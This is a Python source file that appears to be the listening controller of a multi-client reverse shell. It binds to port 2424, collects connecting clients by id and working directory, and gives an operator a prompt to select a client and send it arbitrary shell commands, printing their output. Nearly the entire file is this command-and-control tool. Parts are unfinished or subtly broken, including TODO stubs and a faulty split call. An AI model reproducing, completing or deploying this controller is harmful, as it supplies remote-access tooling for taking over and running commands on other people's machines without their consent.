import socket
import threading
import time
import multiprocessing
import os
import regex as re



class SocketHandler(multiprocessing.Process):
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.connection_list = []
    def handle(self):
        # create a socket object
        sock = socket.socket()
        # bind the socket to all IP addresses of this host
        sock.bind((self.server_host, self.server_port))
        sock.listen(5)
        while True:
            # accept any connections attempted
            client_sock, client_ip = sock.accept()
            current_client = ClientHandler(client_sock,client_ip)
            self.connection_list.append([current_client,None])

    def looker(self):
        __con_lst = []
        while True:
            # print(__con_lst)
            if not __con_lst == self.connection_list:
                for i in range(len(self.connection_list)):
                    elem = self.connection_list[i]
                    if not __con_lst.__contains__(elem[0]):
                        elem[1] = threading.Thread(target=elem[0].handle)
                        __con_lst.append(elem[0])
                        self.connection_list[i] = elem
                        elem[1].start()

class ClientHandler(multiprocessing.Process):

    def __init__(self, socket, ip):
        super(ClientHandler, self).__init__()
        self.ENCODING = 'utf-8'
        self.BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
        self.SEPARATOR = "<sep>"  # separator string for sending 2 messages in one go
        self.ip = ip
        self.command = ''
        self.current_dir = ''
        self.last_response = ''
        self.socket = socket
        self.id = None

    def handle(self):

        # receiving the current working directory of the client
        self.current_dir,self.id = self.socket.recv(self.BUFFER_SIZE)\
            .decode(encoding=self.ENCODING).split(self.SEPARATOR)


        while True:

            # command = input(f'{current_dir} $> ')
            if not self.command:  # look if a command have been push
                time.sleep(1)
                continue  # noting to do

            # send the command to the client...
            self.socket.send((self.command.encode()))
            if self.command.lower() == 'exit':
                break  # ...then if the command is exit, just break out of the loop

            # retrieve command results then split command output and current directory
            self.last_response, self.current_dir, self.id = self.socket.recv(self.BUFFER_SIZE) \
                .decode(encoding=self.ENCODING).split(self.SEPARATOR)

            #if __debug__:
                #print('results', self.last_response)
    def close(self) :
        self.socket.close()  # close server connection





class Cli:
    def __init__(self, sock_handler):
        self.sock_handler = sock_handler


    def handle(self):

        context_root = 'root'
        context_dir = ''
        mark = ' $> '

        while True:
            connection_list = self.sock_handler.connection_list
            cmd_arg = None

            cmd = input(f"{context_root} {context_dir}{mark}").strip()

            if cmd in ['exit']:
                context_root = 'root'
                context_dir = ''
                continue

            if context_dir and not cmd[0:3] == 'run':
                cmd_arg = cmd
                cmd = 'run'
            else:
                cmd = cmd.split(' ', 1)
                if len(cmd) > 1:
                    cmd_arg = cmd[1]
                cmd = cmd[0]

            if cmd in ['help', 'h']:
                self.print_help()
                continue

            if cmd in ['clear', 'cls']:
                self.clear()

            if cmd in ['list','lst','ls']:
                # TODO make connection_list look good
                for e in connection_list:
                    print(f'| {e[0].id} |')
                # TODO add query
                # TODO print heartbeat
                # TODO add info (os? uptime? ping?)

            if cmd in ['connect']:
                # TODO make this part work
                if not cmd_arg:
                    print('ERROR : connect <id> --flag ')
                    continue

                arg_dic = {}
                if cmd_arg.strip()[0] != '-':
                    temp = cmd_arg.lstrip().split(' ',1)
                    arg_dic['id']=temp[0]
                    if len(temp) > 1:
                        cmd_arg = temp[1]
                    else:
                        cmd_arg = None
                if cmd_arg:
                    cmd_arg = cmd_arg.replace('--','-')
                    for arg in cmd_arg.split('-'):
                        print('arg',arg)
                        if arg:
                            root_arg,tail_arg = arg.split[' ',1]
                            arg_dic[root_arg] = tail_arg
                if arg_dic['id']:
                    for e in connection_list:
                        if e[0].id == arg_dic['id']:
                            context_root = e[0].id
                            context_dir = e[0].current_dir

                    if not context_dir:
                        context_root = 'root'
                        context_dir = ''
                        print(f'No active connection with id {arg_dic["id"]}')
                continue
            if cmd in ['run']:
                context_conection = None
                if context_root == 'root':
                    continue
                else:
                    # TODO keep stream open? or print last message? wait or continue?
                    for e in connection_list:
                        if e[0].id == context_root:
                            context_conection = e[0]
                    context_conection.last_response = ''
                    context_conection.command = cmd_arg
                    while context_conection.last_response == '':
                        time.sleep(0.25)
                    print(context_conection.last_response)
                    continue
    @staticmethod
    def clear():
        os.system('cls' if os.name in ('nt', 'dos') else 'clear')
    @staticmethod
    def print_help():
        pass






if __name__ == '__main__':
    multiprocessing.set_start_method('spawn', force=True)
    SERVER_HOST = "0.0.0.0"
    SERVER_PORT = 2424

    sock_handler = SocketHandler(server_host=SERVER_HOST, server_port=SERVER_PORT)
    cli_handler = Cli(sock_handler)
    threading.Thread(target=sock_handler.looker).start()
    threading.Thread(target=sock_handler.handle).start()
    threading.Thread(target=cli_handler.handle).start()
